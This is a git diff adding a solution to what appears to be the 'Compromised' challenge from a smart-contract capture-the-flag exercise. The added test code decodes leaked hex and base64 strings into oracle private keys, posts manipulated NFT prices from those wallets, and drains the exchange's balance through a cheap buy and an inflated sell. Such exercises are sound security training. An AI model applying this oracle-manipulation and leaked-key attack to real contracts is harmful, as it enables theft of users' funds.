@@ -59,8 +59,51 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {  
+        console.log("## GETTING COMPROMISED ORACLE WALLETS")      
+
+        const compromisedOracles = [
+            `4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35`.replace(new RegExp(" ", "g"), ""),
+            `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`.replace(new RegExp(" ", "g"), "")
+        ].map((formattedLeakedData, index) => {
+            //Get the private key. formattedLeakedData means that the spaces have been removed.
+            const trustedSourcePK = Buffer.from(Buffer.from(formattedLeakedData, "hex").toString("utf8"), "base64").toString("utf8");
+            console.log(`   ** Oracle ${index + 1} PK: ${trustedSourcePK}`);
+            const signer = new ethers.Wallet(trustedSourcePK, ethers.provider);
+            console.log(`   ** Oracle ${index + 1} WALLET ADDRESS: ${signer.address}`);
+
+            return signer;
+        });
+
+        const updatePrice = async (newPrice) => {
+            console.log(`## UPDATING COMPROMISED ORACLES PRICES TO: ${newPrice}`)
+            for(var i = 0; i < compromisedOracles.length; i++) {
+                const wallet = compromisedOracles[i];
+                const updatePriceTx = await this.oracle.connect(wallet).postPrice("DVNFT", ethers.utils.parseEther(newPrice));
+                const updatePriceTxReceipt = await updatePriceTx.wait();
+                console.log(`   ** Oracle ${i + 1} NEW PRICE: ${ethers.utils.formatEther(updatePriceTxReceipt.events[0].args[3])}`);
+            };
+        }
+
+        await updatePrice("0.005");
+
+        const buyTokenTx = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.005")});
+        const buyTokenTxReceipt = await buyTokenTx.wait();
+        const tokenId = buyTokenTxReceipt.events[1].args[1];
+        console.log("## TOKEN ID", tokenId.toString());
+
+        const exchangeBalance = await ethers.provider.getBalance(this.exchange.address);
+        console.log("## EXCHANGE BALANCE: ", ethers.utils.formatEther(exchangeBalance));
+
+        await updatePrice(ethers.utils.formatEther(exchangeBalance));
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId.toString());
+        await this.exchange.connect(attacker).sellOne(tokenId.toString());
+
+        const exchangeBalance2 = await ethers.provider.getBalance(this.exchange.address);
+        console.log("## NEW EXCHANGE BALANCE: ", ethers.utils.formatEther(exchangeBalance2));
+
+        await updatePrice("999");
     });
 
     after(async function () {
